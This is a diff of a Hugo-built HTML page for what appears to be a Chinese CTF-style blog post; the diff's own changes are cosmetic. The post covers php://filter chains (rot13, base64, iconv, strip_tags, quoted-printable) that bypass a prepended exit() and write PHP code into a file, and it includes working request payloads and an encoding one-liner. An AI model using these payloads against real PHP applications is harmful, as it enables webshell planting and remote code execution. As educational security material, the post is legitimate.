@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -578,13 +578,13 @@
 <h5 id="情况一"><a href="#情况一" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:情况一" class="headings">情况一</a></h5>
 <p><strong>payload1</strong>：<code>string.rot13</code></p>
 <p>条件：short_open_tag=off</p>
-<pre><code>?file=php://filter/string.rot13/resource=tyskill.php&amp;content=&lt;?cuc cucvasb();
+<pre tabindex="0"><code>?file=php://filter/string.rot13/resource=tyskill.php&amp;content=&lt;?cuc cucvasb();
 </code></pre><p><strong>payload2</strong>：<code>convert.base64-decode</code></p>
 <p>如上面介绍所说，base64解码是4bytes一组，而<code>&lt;?php exit();</code>满足base64符号表的只有七个字符，因此需要在插入的base64编码字符串前面添加一个字符凑满4的倍数。</p>
-<pre><code>?file=php://filter/convert.base64-decode/resource=tyskill.php&amp;content=xPD9waHAgcGhwaW5mbygpOw==
+<pre tabindex="0"><code>?file=php://filter/convert.base64-decode/resource=tyskill.php&amp;content=xPD9waHAgcGhwaW5mbygpOw==
 </code></pre><p><strong>payload3</strong>：<code>convert.iconv.*</code></p>
 <p><code>&lt;?php exit();</code>字符一共13位</p>
-<pre><code># usc-2: 对目标字符串进行2位一反转
+<pre tabindex="0"><code># usc-2: 对目标字符串进行2位一反转
 ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=tyskill.php&amp;content=tyskill?&lt;hp phpipfn(o;)
 # usc-4: 对目标字符串进行4位一反转
 ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=tyskill.php&amp;content=tyskill?&lt;hp phpipfn(o;)
@@ -593,14 +593,14 @@
 <p><strong>payload1</strong>：<code>string.rot13</code></p>
 <p><strong>条件</strong>：short_open_tag=off</p>
 <p>此时由于<code>//</code>的注释效果，我们需要添加%0a换行从而执行php代码</p>
-<pre><code>?content=php://filter/string.rot13|%0a&lt;?cuc cucvasb();/resource=tyskill.php
+<pre tabindex="0"><code>?content=php://filter/string.rot13|%0a&lt;?cuc cucvasb();/resource=tyskill.php
 </code></pre><blockquote>
 <p><code>convert.base64-decode</code>不能使用，原因如下：</p>
 <p>base64中<code>=</code>字符起到一个填充的作用，也是结束的标识，如果在<code>=</code>后面还存在字符则会解码失败，即使这里省略了write参数的=，resource的=仍然无法省略。所以这种既作为文件名又作为文件内容的无法使用单一base64解码解决。</p>
 </blockquote>
 <p><strong>payload2</strong>：<code>convert.iconv.*</code></p>
 <p><code>&lt;?php exit();</code>字符一共13位</p>
-<pre><code># usc-2: 对目标字符串进行2位一反转
+<pre tabindex="0"><code># usc-2: 对目标字符串进行2位一反转
 ?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|tyskill?&lt;hp phpipfn(o;)/resource=tyskill.php
 # usc-4: 对目标字符串进行4位一反转
 ?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|tyskill?&lt;hp phpipfn(o;)/resource=tyskill.php
@@ -614,19 +614,19 @@
 <h5 id="情况一-1"><a href="#情况一-1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:情况一-1" class="headings">情况一</a></h5>
 <p><strong>payload1</strong>：<code>string.strip_tags|convert.base64-decode</code></p>
 <p><strong>条件</strong>：php&lt;7.3.0</p>
-<pre><code>?file=php://filter/string.strip_tags|convert.base64-decode/resource=tyskill.php&amp;content=?&gt;PD9waHAgcGhwaW5mbygpOw==
+<pre tabindex="0"><code>?file=php://filter/string.strip_tags|convert.base64-decode/resource=tyskill.php&amp;content=?&gt;PD9waHAgcGhwaW5mbygpOw==
 </code></pre><p><strong>payload2</strong>：<code>string.strip_tags|convert.quoted-printable-decode</code></p>
 <p><strong>条件</strong>：php&lt;7.3.0</p>
-<pre><code>?file=php://filter/string.strip_tags|convert.quoted-printable-decode/resource=tyskill.php&amp;content=?&gt;=3c=3f=70=68=70=20=70=68=70=69=6e=66=6f=28=29=3b
+<pre tabindex="0"><code>?file=php://filter/string.strip_tags|convert.quoted-printable-decode/resource=tyskill.php&amp;content=?&gt;=3c=3f=70=68=70=20=70=68=70=69=6e=66=6f=28=29=3b
 </code></pre><p><strong>payload3</strong>：<a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">LARAVEL &lt;= V8.4.2 DEBUG MODE: REMOTE CODE EXECUTION</a>提出的清空文件再写入操作</p>
 <p>原理和上面也差不多，就是通过转换编码然后利用过滤器<code>convert.base64-decode</code>删除文件内容从而写入我们自己的🐎(这个方法需要的过滤器有点多，正常情况下不需要用到。。。)</p>
 <blockquote>
 <p>该姿势没办法用于情况二（可能是我没发现怎么用</p>
 </blockquote>
 <p>1、准备🐎(正常来说清空文件那步CTF中用不到)</p>
-<pre><code>echo &quot;&lt;?php phpinfo();?&gt;&quot; | base64 -w 0 | python3 -c &quot;import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())&quot;
+<pre tabindex="0"><code>echo &quot;&lt;?php phpinfo();?&gt;&quot; | base64 -w 0 | python3 -c &quot;import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())&quot;
 </code></pre><p>2、写入文件并删除干扰字符(a补足4位base64解码需求)</p>
-<pre><code>?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=tyskill.php&amp;content=a=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=7A=00=38=00=2B=00=43=00=67=00=3D=00=3D=00
+<pre tabindex="0"><code>?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=tyskill.php&amp;content=a=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=7A=00=38=00=2B=00=43=00=67=00=3D=00=3D=00
 </code></pre><p>这样剩下的就是我们自己的🐎了</p>
 <p>payload4（<strong>失败</strong>）：<code>zlib.deflate|string.tolower|zlib.inflate</code></p>
 <blockquote>
@@ -634,25 +634,25 @@
 写入内容：<code>&lt;?php@?xit();&lt;?php@phpinfo();</code></p>
 </blockquote>
 <p>这写入内容看着就不像能成功的样子吧。。。也不知道啥条件下能解析成功</p>
-<pre><code>?file=php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=tyskill.php&amp;content=&lt;?php+phpinfo();
+<pre tabindex="0"><code>?file=php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=tyskill.php&amp;content=&lt;?php+phpinfo();
 </code></pre><h5 id="情况二-1"><a href="#情况二-1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:情况二-1" class="headings">情况二</a></h5>
 <p><strong>payload1</strong>：<code>string.strip_tags|convert.base64-decode</code></p>
 <p><strong>条件</strong>：php&lt;7.3.0</p>
 <p>之前的写入失败是由于resource后面的=导致解码失败，借助<code>string.strip_tags</code>的删除效果我们可以通过php标签删除=。</p>
-<pre><code>?content=php://filter/string.strip_tags|convert.base64-decode|?&gt;PD9waHAgcGhwaW5mbygpOw==&lt;?/resource=tyskill.php
+<pre tabindex="0"><code>?content=php://filter/string.strip_tags|convert.base64-decode|?&gt;PD9waHAgcGhwaW5mbygpOw==&lt;?/resource=tyskill.php
 </code></pre><p><strong>payload2</strong>：<code>string.strip_tags|convert.quoted-printable-decode</code></p>
 <p><strong>条件</strong>：php&lt;7.3.0</p>
 <p>原理同上</p>
-<pre><code>?content=php://filter/string.strip_tags|convert.quoted-printable-decode|?&gt;=3c=3f=70=68=70=20=70=68=70=69=6e=66=6f=28=29=3b&lt;?/resource=tyskill.php
+<pre tabindex="0"><code>?content=php://filter/string.strip_tags|convert.quoted-printable-decode|?&gt;=3c=3f=70=68=70=20=70=68=70=69=6e=66=6f=28=29=3b&lt;?/resource=tyskill.php
 </code></pre><p><strong>payload3</strong>：<code>convert.iconv.*|convert.base64-decode</code></p>
 <p>通过<code>convert.iconv.*</code>的编码转换也可以消除=，不过这里和上面使用<code>string.strip_tags</code>不同的是这里需要考虑到payload本身字符的长度是否满足base64解码的需求</p>
 <blockquote>
 <p><code>&lt;?php phpinfo();?&gt;</code>编码为<code>PD9waHAgcGhwaW5mbygpOz8+</code>，前面添加的aa是为了补上前面58位长的base64字符，后面只要添加=(几个无所谓)就可以成功（原因我也不是很清楚</p>
 </blockquote>
-<pre><code>?content=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|aaPD9waHAgcGhwaW5mbygpOz8+=/resource=tyskill.php
+<pre tabindex="0"><code>?content=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|aaPD9waHAgcGhwaW5mbygpOz8+=/resource=tyskill.php
 </code></pre><p>payload3（<strong>失败</strong>）：<code>zlib.deflate|string.tolower|zlib.inflate</code></p>
 <p>除了上面出现过的<code>@</code>无法运行问题，还出现了新的问题：内容加了<code>&lt;?</code>就写不进去，不加又不能解析。。。</p>
-<pre><code>?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|%0a&lt;?php phpinfo();/resource=tyskill.php
+<pre tabindex="0"><code>?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|%0a&lt;?php phpinfo();/resource=tyskill.php
 </code></pre><h3 id="其他"><a href="#其他" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:其他" class="headings">其他</a></h3>
 <h4 id="segment-fault"><a href="#segment-fault" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:segment-fault" class="headings">segment fault</a></h4>
 <blockquote>
@@ -733,7 +733,7 @@
                     </li>
                 
                     <li class="related-item">
-                        <a href="/posts/chromeextbuild/" class="related-link">ChromeExt开发从负无穷到0</a>
+                        <a href="/posts/codeql-grafana/" class="related-link">CodeQL第一步-Grafana任意文件读</a>
                     </li>
                 
             </ul>
